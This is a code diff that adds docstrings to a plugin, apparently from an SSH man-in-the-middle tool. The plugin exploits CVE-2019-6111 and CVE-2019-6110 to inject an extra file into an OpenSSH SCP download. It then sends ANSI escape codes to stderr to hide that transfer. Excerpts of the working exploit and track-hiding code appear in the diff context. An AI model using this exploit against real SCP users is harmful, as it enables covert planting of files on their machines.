@@ -1,3 +1,15 @@
+"""
+A plugin for exploiting CVE-2019-6111, CVE-2019-6110, based on the vulnerability
+'SSHtranger Things' of OpenSSH Client.
+
+This class is a subclass of SCPForwarder and injects an additional file during
+SCP transmission by exploiting the OpenSSH Client vulnerability 'SSHtranger Things'.
+This vulnerability has been patched in OpenSSH versions greater than 8.0p1.
+The exploitation process starts by parsing the SCP command and identifying whether
+the SCP client is downloading a file. If yes, the class instance is returned and the
+exploit method is called. The method exploits both CVE-2019-6111 and CVE-2019-6110.
+"""
+
 import logging
 import os
 import sshmitm
@@ -51,6 +63,8 @@ class SCPInjectFile(SCPForwarder):
         return traffic
 
     def exploit(self) -> None:
+        """This method starts to exploit CVE-2019-6111 and CVE-2019-6110.
+        """
         def wait_ok() -> bool:
             if self.session.scp_channel is None:
                 return False
@@ -86,11 +100,13 @@ class SCPInjectFile(SCPForwarder):
         logging.warning("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())
 
     def hide_tracks(self) -> None:
-        # This is CVE-2019-6110: the client will display the text that we send
-        # to stderr, even if it contains ANSI escape sequences. We can send
-        # ANSI codes that clear the current line to hide the fact that a second
-        # file was transmitted..
-        # Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K
+        """
+        This method exploits CVE-2019-6110: the client will display the text that we send
+        to stderr, even if it contains ANSI escape sequences. We can send
+        ANSI codes that clear the current line to hide the fact that a second
+        file was transmitted..
+        Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K
+        """
         if self.session.scp_channel is None:
             return
         self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
